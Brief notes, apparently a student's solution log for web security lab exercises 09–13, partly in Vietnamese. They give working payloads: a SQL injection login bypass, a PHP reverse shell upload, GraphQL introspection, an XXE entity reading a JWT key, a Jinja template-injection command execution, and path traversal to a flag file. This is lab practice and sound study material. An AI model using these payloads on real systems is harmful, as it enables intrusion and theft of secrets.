# Lab 09
SQLi
admin' or '1'='1

upload reverse shell vào template
php reverse shell
---
# Lab 10
Kiểm tra source static lấy đường dẫn
Vào trang utilities, SSTI để đọc file secret.txt

# Lab 11
Xem statis source để xem query

"query": "{__schema{types{name,fields{name}}}}"

"query": "mutation {hiddenRoleSync(username: \"test\")}"

upload bypass content-type

# Lab 12
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///app/secrets/jwt.key"> ]>
<root>&xxe;</root>

Ky lai jwt

RCE 
{{ cycler.__init__.__globals__.os.popen('cat /app/oswa/secret/secret.txt').read() }}

# Lab 13
1. Open the landing page and inspect `static/gate.js`.
2. Deobfuscate the JSFuck block.
3. Recover the entry phrase `hyuen-kiem-van-luc`.
4. Submit the phrase at `/unlock`.
5. Browse a post and open the image viewer.
6. Tamper the `img` parameter to read `../clues/secret.txt`.
7. Use the clue to read `../../../../flag.txt`.
